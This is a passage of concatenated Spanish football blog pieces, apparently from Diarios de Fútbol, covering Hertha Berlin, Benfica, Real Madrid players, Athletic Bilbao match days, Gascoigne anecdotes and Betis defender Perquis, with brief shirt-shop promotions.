la recuperación de la capitalidad, con una gran afluencia de inmigrantes, tanto de otros países como del resto de Alemania. Cada uno trae consigo, aparcado en su memoria, o en forma de bufanda colgada de la pared de la habitación de un lúgubre piso de estudiantes, su propia fidelidad a un equipo de fútbol. Y casi todos ellos acuden al Olímpico al menos una vez al año: precisamente el día que su Stuttgart o su Wolfsburg del alma visitan al Hertha. Berlín es demasiado multicultural como para aferrarse con firmeza a un único club de fútbol y abrazar una sola fe futbolística. Berlín es un saco lleno de muchos corazoncitos variopintos. Berlín, sexy y vanguardista como pocas capitales europeas, es un banderín del Galatasaray colgado tras la barra de un döner kebab de Kreuzberg.La particularísima idiosincrasia de la Berlín del Muro tuvo su repercusión, como no podía ser de otra forma, en el fútbol. Nadie lo ha contado mejor que Simon Kuper en su excepcional ‘Fútbol contra el enemigo‘ (Contra, 2012), en boca del ‘disidente’ futbolístico Helmut Klopfleisch, al que el Muro de la vergüenza separó forzosamente de su Hertha del alma durante veintiocho largos y agitados años. La profusión de clubes de muy diversa índole, cada uno con sus particularidades socio-políticas, no contribuyó precisamente al desarrollo de un club poderoso ni en el este ni en el oeste de una ciudad caótica, y no sólo en lo futbolístico, durante muchos años.Cuentan que las circunstancias propicias pudieron haberse dado por fin cuando, días después de derribado el Muro, el Hertha jugó por primera vez en Berlín tras la reciente reunificación. Una marea humana de seguidores del Hertha procedentes de la zona este acudieron en masa al Olímpico con la ilusión de ver cumplido un sueño tan cercano como prohibido durante toda una vida: ver a su equipo en vivo. La fiebre duró poco. Para el segundo partido en casa tras la reunificación, la directiva del club decidió invitar al encuentro a los dirigentes del Dynamo y del Union, algunos de ellos antiguos miembros de la temida Stasi. La respuesta de sus ‘nuevos’ seguidores procedentes del este no se hizo esperar. No querían compartir estadio con aquellos que se habían encargado de privarles, entre otras muchísimas cosas bastante más trascendentes, de su equipo de fútbol.El Hertha no pudo construir una masa social poderosa aprovechando una circunstancia tan favorable como la reunificación. Muchos de sus seguidores continuaron siéndolo, por supuesto, pero dejaron de lado esa ‘obligación’ asumida por todo hincha de acudir cada dos semanas al estadio. El club berlinés se desligó de buena parte de sus aficionados porque quiso vendar unas heridas que aún no habían sido cauterizadas.Como si Damiel y Cassiel, los dos ángeles que surcaban el cielo y la vida de Berlín y los berlineses en la película de Wim Wenders, hubiesen decidido abandonarse a placeres más mundanos y hubiesen puesto algo de lo suyo en el Olímpico, el Hertha Berliner Sport-Club brilla hoy como hacía tiempo que no se veía. Con la Bundesliga habiendo atravesado ya su ecuador, el equipo dirigido por el húngaro Pál Dárdai ocupa posición de Liga de Campeones en la clasificación. Aunque aún no supone amenaza para la implacable autoridad que llega de Múnich y Dortmund, Berlín puede volver a sentirse hoy una ciudad de primera clase. Mucho menos triste. Mucho menos pobre.Puedes comprar camisetas del Hertha BSC en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. No éramos benfiquistas y nada en particular nos unía sentimentalmente de una manera especial al club lisboeta, pero aquella sucesión de acontecimientos nos partió a todos el alma. Una desdichada concadenación de inoportunos tropiezos para la entidad de Da Luz se produjeron entre el once y el veintiséis de mayo de dos mil trece. Tres catástrofes cruelmente enlazadas en un breve lapso de tiempo que llevaron al conjunto dirigido por Jorge Jesus a ver cómo se le escapaban de entre los dedos los tres títulos que consideraba prácticamente en su mano. El Benfica perdió la Liga en un agónico partido en Oporto, encajando el gol de la derrota en el tiempo añadido y permitiendo que los tripeiros les adelantasen en la tabla a falta de un último encuentro, cayó derrotado en la final de la Europa League ante el Chelsea por dos goles a uno, nuevamente con un gol en tiempo extra, y se vio sorprendido, probablemente presa ya de una pesadumbre y una angustia difícil de gestionar, por el Vitória de Guimarães que, para contribuir a la crueldad del episodio, remontó el gol inicial de Nico Gaitán en los diez últimos minutos del choque.La extremadamente cruel resolución de la temporada benfiquista hubiera podido tener una víctima fácil. Jorge Jesus, rodillas hincadas en tierra, era carne de cañón cuando el Guimarães terminó de confirmar que lo que se esperaba como un éxito sin precedentes terminó convirtiéndose en un estrepitoso fracaso sin paliativos. Sin embargo, el fútbol desplegado por por las Águias a lo largo de la campaña no había dejado un mal poso. Dio la sensación de que el penoso desenlace tuvo una buena dosis de mala suerte y una importante influencia de la componente psicológica, especialmente tras la derrota en Oporto que daba un vuelco a la clasificación liguera en la penúltima jornada del torneo. Aquella significativa imagen del técnico benfiquista arrodillado en la banda del Estádio do Dragão con la cabeza hundida entre los hombros, en un gesto mezcla de sumisión y resignación, terminaría sirviendo de expresivo resumen gráfico de la temporada lisboeta.En contra de lo planteado por algunas voces autorizadas al término de la pasada campaña y por un sector muy importante de la afición, Jorge Jesus siguió en Da Luz ampliando incluso su contrato por dos temporadas más. Renovada la confianza del presidente Luís Filipe Vieira, el técnico resistió incluso a un arranque de temporada algo dubitativo y a un paso por la fase de grupos de la Liga de Campeones ciertamente decepcionante (tercero en un grupo con PSG, Olympiakos y Anderlecht). Y de pronto, la maquinaria echó a andar y se volvió imparable. Los partidos de liga se contaban por victorias, al tiempo que la distancia con sus perseguidores, los habituales Sporting y Porto (éste, esta vez, a años luz en la tabla) aumentaba para tranquilidad benfiquista. Confirmado el título liguero el pasado fin de semana y con el premio extra en el horizonte de la final de la Taça frente al modesto Río Ave, el Benfica afronta una nueva oportunidad de triplete, siempre que consiga deshacerse de la correosa Juventus en la semifinal de la Europa League (2-1 en la ida en Da Luz).Y ya no te gusta demasiado porque no te la terminas de creer. Porque en ella hay algo que ya no es de ella. Como el colega de facultad que se ha dejado crecer una moderna y larga barba pero sigue teniendo la misma cara de imbécil de siempre. Como cuando Mr. Proper pasó a llamarse Don Limpio. Toda esa porquería de la modernidad mal entendida, de los cambios. Cambiar a peor en vez de mantener lo que fuimos. Como si el mercado estuviera por encima de los gustos o de la propia historia. Mi indignación es infantil. Estoy tan cabreado que tenía que escribir esto. Dice Dadán Narval que cambiar los colores es empezar a perder. Estoy por llevar a Adidas a Estrasburgo. El domingo me levanté muy temprano por ese despertador inmisericorde que son las preocupaciones. Se quedan ahí, martilleando la campana, y ya no hay quien vuelva a cerrar los ojos. Antes no había preocupaciones, ahora me acompañan en el desayuno como las mascotas de los cereales en los anuncios de mi infancia.Me afeité somnoliento tal y como los actores de comedia hacen. Enjabonado y silbando una canción irreconocible.Tras el cruel desenlace de la pasada campaña y la apuesta por la estabilidad que supuso la confirmación y ampliación de contrato de Jorge Jesus, esta es una de esas ocasiones en las que, por lejano y anodino que te resulte el equipo, resulta imposible no alegrarse de sus éxitos. Porque por una vez el tiempo acabó cargando de razones a los sensatos y a los prudentes, a los que creyeron en las personas a pesar de sus posibles errores y desoyendo. Y eso, al final, no deja de ser un motivo de alegría. Aunque no fuéramos benfiquistas.Puedes comprar camisetas y equipaciones del SL Benfica en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Aún recuerdo con indisimulable sonrojo aquella patochada de ‘nace el Madridisco‘. Intuyo que ya estáis imaginando el autor de semejante lección de periodismo moderno. Tomás Roncero se erigió en portavoz del Bernabéu cuando apenas habían transcurrido tres jornadas del pasado campeonato de Liga y no dudó en señalar al recién llegado Isco como uno de los protegidos dentro de la joven camada madridista. No había dudas sobre su capacidad. El malagueño llegaba a Madrid con la vitola de fichaje estratégico del florentinismo, destinado a ocupar un lugar importante dentro de los esquemas de Carlo Ancelotti y con la compleja misión inmediata de hacer olvidar al añorado Mesut Özil. Pero nada de aquello ocurrió y la realidad acabó por devorar las opciones del nuevo jugador blanco. Sin opción de encajar en el 4-3-3 de Ancelotti y eclipsado por el papel del reinventado Di María, Isco vio como su suerte en el Madrid daba un giro radical. Ni los treinta millones de euros de su traspaso parecían pesar lo suficiente como para forzar su entrada en el once. Cuando gozaba de minutos, los dilapidaba viendo la vida pasar colgado de una banda, muy lejos de la zona de riesgo y de allí donde su arrancada y su conducción lo convierten en un futbolista diferente. Llegaron los éxitos e Isco perdió relevancia progresivamente porque parecía no ser necesario. El furor desatado tras su llegada (su camiseta gozaba de notable presencia en el graderío del Bernabéu cuando apenas se le había visto de corto) se fue enfriando hasta acabar convertido en una anécdota borrosa. Llegó James, como la metadona que alivia el mono en Florentino, y mucho nos temimos que la historia de Isco en el Real Madrid ya hubiera quedado escrita y pendiente solo de epitafio. Hubiese sido una reprobable desgracia.Sin embargo, el centrocampista andaluz contaba con lo más importante para triunfar como futbolista del Real Madrid: él, que por lo que fuese había caído en gracia, sí parecía disfrutar de la paciencia infinita de su afición, la misma paciencia que a otros se les negó de entrada. Por eso, actuaciones como la del pasado sábado en el Ciutat de València son un premio a esa paciencia y disparan la euforia del madridismo en torno a su figura. Más allá de el tanto que sirvió de rúbrica a su soberbio partido, acciones como la que da origen al tercer gol del equipo, con robo en campo propio, protección del balón, conducción y lanzamiento de la contra para el gol de Ronaldo, amplifican la voz de los que claman por un sitio fijo para Isco en los esquemas de Ancelotti. Luis Suárez. Hat-trick. En el día del primer aniversario de su debut como azulgrana, el charrúa firmó una actuación de esas que justifican una inversión como la realizada para su incorporación. En un partido extraño y del que el Eibar de Mendilibar no llegó nunca a marcharse definitivamente, el olfato del nueve azulgrana salvó esta vez los muebles de un equipo que, en ausencia de Messi, encarga a la ruleta rusa la designación de su salvador jornada tras jornada. Si la pasada semana fue Neymar, esta le tocaba a Suárez. Lo malo será cuando al caprichoso tambor se le antoje escoger bala.Kevin Gameiro. Otro hat-trick. El primero del francés desde su llegada a España y, realmente, su primer gran partido (ante un rival prácticamente entregado, eso sí). Es el sevillista un delantero atípico. No es un hombre de área, no es especialmente corpulento ni se desenvuelve bien en el uno contra uno, tampoco es un prodigio de velocidad. Sin embargo, es tremendamente oportunista y de destacada movilidad sobre todo el frente de ataque. Aparece en el momento preciso y en el lugar ideal y centellea muy bien ante defensores de cintura ancha y escasa maniobrabilidad. Sin Bacca, y con necesidad de justificar rendimiento ante las llegadas de Immobile y Llorente, Gameiro vive sus mejores días desde que llegó a Nervión.Yannick Ferreira-Carrasco. Voy a confesar que mis referencias previas sobre el atacante belga (de origen hispanoluso) eran prácticamente nulas. Pero su evolución como futbolista del Atlético de Madrid, claramente de menos a más, se está mostrando imparable. Es un extremo ‘de verdad’, de los que encaran a su rival y se atreven sin miedo a jugar al desborde. Es eléctrico, fugaz y con una chispa especial. Un perfil diferente para el Atleti que apunta a ser una de las revelaciones de la temporada.Le deseamos la mejor de las suertes en el empeño, más que nada porque su buen trabajo nos facilitará la vida al resto.Con suerte desviará la atención por un instante de la expansión en Asia para descifrar qué hacer con los 32 empleados de Barça TV que viven en el limbo desde la externalización del servicio a Mediapro, logrará que su presidente no les falte al respeto en público, o conseguirá que en la web (preciosa pero cada vez más disminuida en la calidad del contenido) no se identifiquen “éxitos sociales del club” con la firma de un acuerdo puramente comercial para vender la imagen del club en Google +. Aunque el auténtico pelotazo sería que logrará que entrenador y futbolistas nos dejasen contarle a los lectores historias un poquito más interesantes que las que se cuecen en rueda de prensa. Por pedir que no quede ahora que arranca el año nuevo. “Doy las gracias al club por haberme traído de vuelta a Italia”, declaró Simeone en  rueda de prensa ignorante de que no se había movido ni un centímetro de Argentina.Habrá argentinos exiliados que se las ingenien para matar la moriña tomando mate en casa de unos amigos o, los menos sociables, repasando portadas de El Gráfico en su casa antes de acostarse. Pero los pocos que emigraron a Sicilia, la mayor parte de la inmigración es rumana o norteafricana, lo tienen más sencillo. Solo tienen que acercarse hasta al aeropuerto de Catania-Fontanarossa, tomar asiento en la terminal y confiar en la estadística. Más temprano que tarde aparecerá por el pasillo un compatriota dispuesto a engordar el anómalo censo del Calcio Catania. Y es que el club del elefantino, por aquello de no descuidar su recién adquirida querencia por lo argento, acaba de contratar como entrenador a Diego Pablo Simenone para elevar a catorce la nómina de argentinos en el Catania. Un técnico y once futbolistas a los que hay que sumar al Mono Burgos, que trabajará de segundo y al preparador físico Oscar Ortega ¿Miedo a los clanes? En todo caso al de los italianos… La Copa del Mundo te cambia la vida. Solo llevamos tres días y Enrique Ballester ya vive entre escombros, yo mismo ando a caballo entre el lavabo y la televisión y Del Bosque ya es carne de guion para una buena novela negra. Impagable la imagen del seleccionador, cowboy exhausto, dormido en el sofá ya de madrugada mientras la televisión escupe imágenes del Mundial en bucle. A Joel Campbell, compacto delantero de Costa Rica, le ha sucedido tres cuartos de lo mismo. Hace dos meses provocaba la carcajada viral al explicar que su plan para el Mundial pasaba por comprar cromos como un poseso para ver si encontraba el suyo. Hoy es todo un país el que mataría por ese cromo.Un jugador que tiene la culpa del enésimo meme para burlarse de Wenger no puede ser malo. Se le viene intuyendo desde la Copa América de 2011 pero contra Uruguay ha roto el escaparate. Quizá junto a la de Oscar en el partido inaugural, la suya es la mayor exhibición individual hasta el momento. Fue inteligente en todos sus movimientos como único punta, demostrando que los años pisando la banda no le han borrado el disco duro. Aguantando la pelota o peinándola de cabeza para que el compañero desate el contragolpe. velocidad, técnica y oficio de nueve. Con colocación y potencia en el primero, aprovechando con un derechazo violento el enésimo error de una zaga uruguaya destartalada; con calidad nítida en el 1-2 para filtrar un pase medido y encarrilar el tanto de Óscar Duarte.Cuando acabe el Mundial haremos cuentas para ver quien merece estar en el álbum pero Campbell ya nos ha enviado su cromo.100 sobres y no me encontré #BadLuckCampbell pic.twitter.com/Mwj5MhSkJV— Joel Campbell (@joel_campbell12) abril 9, 2014 La Segunda no es ningún gastrobar, es una taberna en la que hay hostias por coger los pinchos calientes. Aquí pirateamos las pegatinas de Tripadvisor y hacemos matemáticas para rebañarle dos clientes al de la esquina. En los pasillos hay sudores para entrar y salir y el barullo de caras curtidas es incesante. Si miras a la pared hay un azulejo con una frase de Carlos Terrazas que reza: “lo normal en el fútbol y en la vida es fracasar”. Está colgado junto al que dice “hoy hace un día estupendo, verás como entra alguien y lo jode” El Oviedo empató el sábado en Albacete y la Segunda nos sigue gustando pese a todo.En el Carlos Belmonte, dos milagros de una tacada. Apareció un punto donde no había y un entrenador ofreció la visión sincera del negocio. Luis César Sampedro, de la misma facultad de filosofía que Terrazas, habló con claridad. Puso sustancia donde la mayoría servimos una espumita de igualdad o una esferificación de competitividad. Ofreció la rueda de prensa que define la categoría. “Yo no soy Guardiola. Pierdo más que gano y como toda mi vida perdí más que gané estoy acostumbrado y sé navegar. Sé estar en la tempestad y aguantar el timón y a mí no me tiembla el pulso. ¿Que me gusta mojarme con el timón y aguantar la tempestad? No me gusta, pero es el oficio. Sacaremos esto hacia adelante y el Albacete el año que viene estará en Segunda A” Hay tanta verdad en la frase que si entrase en una chapa como la del ‘This is Anfield” escribiría al club para que la colgasen en los vestuarios del Tartiere. Si no se puede, que pongan la de Terrazas. Y si no quieren en el vestuario que la pongan en la grada.La categoría es lo que dicen Terrazas y Sampedro. Una pantalla lúgubre del Ghost’n Goblins en la que hace falta pegar hasta el último mandoble. Una liga salvaje en el que vencerá el que más aguante. Pura Royal Rumble y no otra cosa.Jugador del agrado de Mourinho, ha demostrado en seis meses que no tiene ningún peso defensivo, es incapaz de dar un pase a más de cinco metros, es inofensivo en ataque a pesar de ponerle voluntad, y se vuelve más invisible cuanto peor se ponen las cosas. Su mayor virtud es el poderío aéreo en las disputas, y juega a su favor que, como no intenta nada, se equivoca muy poco. De los futbolistas más limitados que han jugado en el Real en mucho tiempo, uno lo imagina en el Camp Nou como suplente del suplente del suplente de Busquets.Xabi Alonso. El jugador más importante del Madrid, el que sostiene un equipo que en su ausencia se ha desplomado casi sistemáticamente. Inigualable en el juego en largo y correcto en el desplazamiento corto, añade a su juego exquisito una profunda sabiduría y un compromiso defensivo que frecuentemente pasa desapercibido. Cerebro del equipo en el sentido más clásico del término, es ya el capitán in pectore de una escuadra necesitada de referentes. La única posibilidad del Madrid de disputarle a medio plazo la hegemonía al Barcelona es fichar los acompañantes adecuados para que en partidos como el de mañana no sea la voz del que clama en el desierto.Granero. Futbolista con muchos amigos en el periodismo y al que viene de perlas proceder de la cantera, no acaba de dar el paso adelante que hace falta para triunfar en un equipo como el Madrid. Poseedor de un estupendo toque de balón, bueno a balón parado y con una habilidad natural para la diagonal y el cambio de juego, acaba pasando de puntillas por los partidos que disputa como un fantasma timorato y falto de carácter. No ha respondido ni a Pellegrini, que le dio su confianza, ni a Mourinho, que desconfía bastante más de él, porque además no es su tipo de futbolista. Su mejor partido, en el Sardinero.Gago. Ausente muchos partidos de la temporada por una lesión, el que Segurola definió un poco audazmente como el nuevo Guardiola en sus tiempos de Boca ha acabado sumergido en una tiniebla de indefinición, y seguramente escogió el camino equivocado para adaptarse al fútbol europeo: en lugar de reforzar su juego natural de toque fácil y apoyos, intentó dotarlo de una intensidad física para la que no está preparado.Su partido anoche ante el Valencia (golazo incluido) ha conseguido, de momento, poner su nombre en boca de todos los aficionados.Keylor Navas. Keylor es probablemente el futbolista que más asiduamente aparece en esta sección. Y no se sabe si eso es algo precisamente bueno para su equipo. Sea como fuere, su partido del sábado en Balaídos está a la altura de lo mejor del mundo en estos momentos. Paradas de todos los colores, una velocidad de piernas y de reacción que resultaría envidiable para cualquier meta de primerísimo nivel, un estado de forma insuperable y una seguridad en sí mismo que crece jornada tras jornada. A estas alturas ya nadie se acuerda en el Bernabéu del frustrado fichaje de David De Gea. No podrían tener mejor portero que el costarricense.Imanol Agirretxe. Tras una temporada pasada considerablemente pobre en la que apenas consiguió anotar siete dianas, en la presente campaña ya lleva seis cuando llevamos disputado un cuarto de la misma. Parece que la competencia llegada desde fuera tras la incorporación de Jonathas de Jesús ha sentado bien al punta de Usurbil. Ayer volvió a mojar en el Ciutat de València y además sirvió el primero en bandeja a Carlos Vela con un espectacular pase a la espalda de la defensa levantinista que si no lo has visto deberías hacer por verlo. De sus goles puede depender que la Real empiece a ir hacia arriba de una vez por todas. Dice el diccionario de la RAE que una liturgia es un ‘ritual de ceremonias o actos solemnes‘ y, discúlpenme la bravata, en Bilbao, entendemos un poco de actos solemnes cuando se trata de fútbol. Porque los partidos importantes los empezamos a jugar, cada uno a su particular manera, varias horas antes de que el balón empiece a rodar. Ya desde primera hora de la mañana el ambiente es diferente en la ciudad. No hay un solo bar sin su bandera rojiblanca ondeante en la puerta, como queriendo recordar a todo el que pase por delante del establecimiento que es día señalado y que todos los bilbainos (con diptongo) tenemos un compromiso ineludible a última hora de la tarde. La espera es tensa, nerviosa, y el día transcurre lento como el fluir de la Ría porque es imposible aislarse del ambiente de fútbol por mucho que uno pretenda centrarse en sus quehaceres cotidianos. En Bilbao acaba interesándoles el fútbol incluso a quienes no les interesa lo más mínimo.Salir del portal de casa es como meterse en el vestuario. Saltas a la calle con tu camiseta, y esto es innegociable tengas diez años o sesenta, y sin más equipaje que las llaves y un bocadillo, porque realmente no necesitas más y es mejor ir ligero. Pozas está hasta arriba. Los corrillos formados a lo largo de más cuatrocientos metros de calle ejercen de charla táctica, de preparación del partido, de líneas cruzadas en una pizarra a la que ya casi nadie atiende porque la misión de las miles de personas que hacemos la espera más llevadera cerveza en mano tiende más a lo pasional que a lo cerebral. Queda poco menos de una hora para que el árbitro pegue ese silbatazo que el ensordecedor ambiente jamás te permite escuchar y que indica que el balón debe ponerse en juego.Se da la circunstancia de que la calle Licenciado Poza transcurre prácticamente en paralelo a algo tan genuinamente bilbaíno como la Ría. En días de partido, además, la función entre el céntrico vial y la corriente que sirve de desembocadura del río Nervión es muy similar. Ambas se encargan de transportar una masa incontenible, agua una y personas la otra, hacia su destino final. Porque así como la Ría conduce las aguas dulces a su encuentro con las saladas en su salida al mar Cantábrico por El Abra, Pozas conduce a la marea humana teñida de rojo y blanco hasta San Mamés. Hasta el viejo, durante cien años, y hasta el nuevo ahora. Todo en un lento peregrinar. Es el calentamiento progresivo. El rondo para soltar piernas y aliviar la tensión. Los primeros toques de balón. La intensidad del esfuerzo aumenta conforme se va acercando el coloso al final de la calle. Y es que es un coloso, realmente. El nuevo San Mamés luce un aspecto sobrecogedor, entre sorprendente e intimidatorio. A medida que uno se aproxima, el estadio se expande ante la mirada gigantesco, resplandeciente, magnético. Cuando uno emboca su puerta de entrada al recinto, atraído en los últimos metros por una especia de fuerza de gravedad, el cuerpo ya está preparado para darlo todo. Ya nada ocupa tu mente.Y es al abrirse paso desde las entrañas de las graderías y visualizar por primera vez el brillo del verde ahí abajo cuando uno sabe que ya, por fin, empieza su partido, el que lleva todo el día esperando. Que si Beñat remata fuera ahí vas a estar tú para darle una animosa palmada en la espalda y gritarle que ya llegarán más ocasiones. Que si Balenziaga se pone nervioso y se le escapa ese control sencillo, no le va a faltar un grito de ánimo y confianza. Que si De Marcos se deja la vida, como haría cualquiera de los cincuenta mil que allí estamos, por salvar un balón que se pierde por la banda te vas a romper las palmas de las manos agradeciendo su esfuerzo. Que si esa mole musculada que el rival ha plantado en el centro del campo carga con fuerza contra Muniain, vas a correr a encararte con él y dar la cara por el que lleva la misma camiseta que tú. Y que si Aduriz marca… ¡ay! si Aduriz marca…Y creo que esa comunión mágica que convierte al equipo y la grada en un todo indisoluble, esa cercanía y similitud entre jugador y aficionado, es lo que nos hace tomarnos el partido como un compromiso personal, como una labor más dentro de nuestro particular ejercicio diario de bilbainismo. Pensándolo en frío y con la frecuencia cardiaca recuperando ya su ritmo habitual, el hecho de que catorce chavales nacidos en un radio aproximado de unos doscientos kilómetros a la redonda hayan conseguido meterse entre los 32 mejores equipos de Europa debe ser considerado como una auténtica proeza en el fútbol actual. El Athletic Club no es más que nadie, ni tampoco pretende serlo. Tampoco ansía ser visto como un caso especialísimo en el panorama futbolístico moderno. Pero es un motivo de enorme peso para que todos los bilbainos (otra vez con diptongo) nos sintamos orgullosísimos del grupo que ha tenido la fortuna de poder representarnos a todos sobre el césped. Lo siento… Pido perdon… No tengo palabras mas… Estoy el mas triste…— damien perquis24 (@damienperquis24) febrero 23, 2014Al finalizar el partido de Europa League de pasado jueves que enfrentó al Real Betis con el Rubin Kazan, Damien Perquis (Troyes, Francia, 1984) se vio envuelto en una desagradable refriega con varios futbolistas del club ruso.El Oviedo no va a ganar arrollando, no nos van a llevar en palmitas ni los pivotes malabaristas ni los esfuerzos individuales. Tampoco toca destrozarse la espalda a latigazos por no liderar el cotarro cuando acabamos de ascender. Cuatro empates consecutivos son buenísimos porque nos dejan a un punto del ascenso directo. No hay mucho más. Seguir sujetando el timón entre todos y navegar con paciencia hasta el final.Foto: Nacho en Flickr ¿Dónde vas con mantón de Manila? ¿Dónde vas con vestido chinés? Pues al Villarreal o al Corinthians y sentarme al banquillo después. Léase con entonación chulapa y zarzuelesca, que es lo que le pega al nuevo mercado de fichajes. En plena crisis deportiva y con el futuro en el alero va el Villarreal y se refuerza con un tal Fen Renliang, humorista, internacional chino y estrella itinerante desde que Xtep, la firma de ropa que viste al club, y el submarino han decidido que el asunto es estratégico. Quizá lo oportuno hubiera sido incorporar algo de chicha futbolística pero el nuevo Football Manager, el Risk comercial, manda.El Corinthians también ha conseguido su figurita china, Chen Zhizhao, un futbolista del que no se espera gran cosa, en palabras de su propio representante, salvo que sea el ganchito que acerque aun más las relaciones comerciales entre Brasil y China. “El jugador no ha venido para jugar inmediatamente o para disputarle el puesto a los futbolistas del Corinthians” dice. “Las relaciones con Brasil han entrado en una nueva era” apunta Qiu Xiaoqi, embajador de China en Brasil. China es uno de los mayores socios comerciales de Brasil, por encima incluso de los Estados Unidos. Plantar a “Chenzinho” en el Corinthians es una manera tan válida como otra cualquiera de publicitar su negocio. Como los hombres anuncio que desgastan sus suelas cada día entre Montera y Sol.Los nuevos embajadores no llevan traje y pajarita, van con camisetas horteras y pelos disparados. Son los futbolistas al servicio de intereses que van bastante más allá de lo deportivo. Los peones. Que sean capaz de adaptarse, de darle alguna recompensa al hincha en forma de regate o, y esto ya suena utopía, unas cuantas tardes de buen fútbol es lo de menos. Que la sóla mención de Paul Gascoigne revoluciona las hormonas de los editores de Diarios de Fútbol como pocas cosas en la vida es algo que ha quedado sobradamente demostrado a lo largo de los cuatro años de vida de la casa. Ramón Flores ya repasó en su día la carrera de un fenómeno que por momentos supo equilibrar su carrera en el alambre con un vara construida de genio y locura. Borja Barba hizo lo propio, sobre el colchón del “This Charmin Man” de los Smiths, al desparramar unos cuantos párrafos certeros sobre el más brasileño de todos los futbolistas ingleses. Regresamos incluso a aquella tarde de Junio en el frío Delle Alpi de Turín, cuando las lágrimas del genial desequilibrado nos recordaron de que va el asunto de la pelotita. Es mi turno ahora paracompletar el trabajo, para rajar la piñata de Gazza y dejar caer sobre la mesa cinco historietas sonadas sobre los alrededores del genio bufo. Ahí van.1. Abrir un tabloide allá cuando los años noventa tocaban a su fin y toparse con Paul Gascoigne involucrado en cualquier extravagante escándalo nocturno era todo uno. No importaban día ni hora, Gazza trabajaba a jornada completa. Durante esa época, tan sólo una hora después de disputar un partido con Inglaterra se dejó caer junto al humorista Danny Baker y el presentador Chris Evans (recomiendo encarecidamente cotejar las fotografías enlazadas) por Hampstead para acodarse en la barra de cuanto pub se cruzase en su camino. Nada raro, excepto por el pequeño detalle de que Gazza apareció vestido completamente de futbolista. No se había cambiado ni las botas.2. En un paseo por Londres, saltó como un niño inquieto de su automóvil para pedirle a un obrero que le dejase pobar  su taladro neumático just for fun. Desoyendo cualquier interpretación obscena de la pregunta y  seguramente conmovido por la cercanía del ídolo, el operario accedió. Así, después de recibir luz verde, el mostrenco favorito de Inglaterra despedazó despreocupado el pavimento capitalino para solaz propia y de los transeuntes. En otra ocasión, viajando en uno de esos autobuses dobles en Picadilly Circus, le rogó al conductor la posibilidad de conducir el pintoresco vehículo durante un rato. Lo logró y todos los pasajeros se expusieron a un choque mortal en medio, eso sí, de un gran alborozo.3. En el 90, antes de mojar el verde con lágrimas en el mundial italiano los responsables de la cobertura televisiva tuvieron una espléndida idea y se la sirvieron en bandeja de plata al astro. Decidieron acompañar las imágenes que emitían durante el repaso visual a las alineaciones, ese paneo que es ya un clásico, con una pequeña filmación de cada jugador diciendo su propio nombre. El sonajero que Gascoigne tiene por cerebro le llevó a subvertir el proceso y en lugar de su nombre dijo fucking wanker, algo así como puto gilipollas. La BBC, sobria y contenida institución, tuvo que emitir la astracanada durante todo el torneo.4. Jugando ya en Roma, se le preguntó en emisión televisiva para toda la nación su opinión sobre el juego de su equipo por entonces, la Lazio. La respuesta de Gazza fue elocuente, un entusiasta eructo al micrófono del reportero. Llegaron las risas y también la multa, obviamente. Anteriormente y durante su primer cara a cara formal con Sergio Cragnoti para discutir su traspaso al club italiano se apresuró a decirle al presidente laziale de la época y reconocido magnate nacional que le recordaba horrores a Bud Abbott.5. Mujeres y flores. Comprometido con los chicos del barrio, le consiguió una cita a uno de sus mejores amigos, Jimmy, con una bonita chica. Gazza sabía de sobra, que esta era en realidad un travesti. En otra ocasión y tras pagarle a su ex-mujer Sheryl un par de implantes de tetas, le envió flores al hospital tras la operación. La nota decía, “para Dolly Parton”. Finalmente envió una rosa al vestuario del Wimbledon a la atención de Vinnie Jones, después del infame estrujamiento de huevos al que le sometió el hombre duro del fútbol inglés. Vinnie, siempre cortés, le hizo llegar una escobilla de baño a cambio. Con zapatillas chillonas baja de una bici sin marchas y con restos de cookies en esa barba inabordable me habla de storytelling. De la historia emocional para como concepto central para que las marcas vendan su historia.‘Vinieron dos o tres a por mí, pero como si vienen todos. Yo tengo dos huevos‘, se jactó el defensor polaco de origen francés. Su retórica post-tángana fue recibida por parte de la afición bética como una dosis de testosterona muy necesaria en tiempos como los que corren por el Villamarín. Olé sus huevos. Hay jugadores a los que se les ha reprochado de manera vehemente su carácter pusilánime y su actitud pasota ante la delicadísima situación que vive el equipo verdiblanco, y reacciones como la del central internacional por Polonia suelen ser bien recibidas por una afición que necesita ver que sus futbolistas sienten, sufren y padecen como lo hacen ellos desde la grada. Hay que echarle un poco más de atributos, vaya.Huevos… y neuronas. No es nuevo lo de que el Real Betis se juega la vida en cada partido que viene disputando desde hace aproximadamente un mes hacia aquí. Y bajo semejante presión se planta cada fin de semana ante un nuevo reto en forma de partido. No importa el rival, al Betis ya solo le vale ganar, porque su necesidad de sumar puntos es ya dramática. Y cuando no tienes margen de error, cuando el más mínimo paso en falso es penalizado de forma gravísima, la tensión termina arrasando con cualquier planteamiento templado de los partidos. Un mínimo detalle en contra y todo salta por los aires. Al Betis que se presentó ante el Athletic Club lo terminó de desquiciar Gil Manzano. No vamos a andarnos con paños calientes y medias tintas. La actuación del árbitro extremeño condicionó muy gravemente el rendimiento del cuadro verdiblanco ante el Athletic. Escamoteó un claro penalti en área visitante y, acto seguido, tiró de imaginación para señalar uno, infinitamente más discutible, en área bética. Eso podría hundir a cualquier equipo. Con el Betis, es más que suficiente para que se le salga la cadena.Perquis, jugador por lo que hemos visto de fuerte temperamento, fue uno de los que más sufrió la desquiciante actuación arbitral. Señalado con amarilla en la falta que dio origen al penalti en área de Adán, tardó poco en autoexpulsarse, al encontrar una innegociable segunda amarilla tras una salvaje, desproporcionada y probablemente alevosa entrada sobre Balenziaga en el centro del campo. El polaco no necesitó ni mirar atrás, síntoma inequívoco de que conocía las consecuencias de su acción. Se dejó engullir por el túnel de vestuarios, como queriendo ocultar la vergüenza, y dejó a los suyos vendidos en el campo de batalla, con un resultado adverso y un hombre menos. De manera absolutamente irresponsable, como probablemente advirtió el propio futbolista tras sentarse en el vestuario y tomar aire dos o tres veces.A Perquis el Real Betis le paga por jugar al fútbol y por defender sobre el campo la camiseta que viste. Y eso incluye evitar reacciones como la de ayer. El 0-1 no era ni mucho menos un resultado insalvable para los béticos. No, al menos, en igualdad de condiciones sobre el césped que su rival. El patinazo del central verdiblanco dista mucho de ‘tener dos huevos’, como él mismo advertía tras el partido ante el Rubin. Más bien se acerca a todo lo contrario, a tener pocas ganas de enfrentarse a la dura realidad del beticismo, a pretender limpiarse del desastre en mitad del caos desatado por Gil Manzano. Precisamente, lo que menos necesita el Betis y la única respuesta que no merecen todos los que cada domingo se desgañitan por él. El milagro del 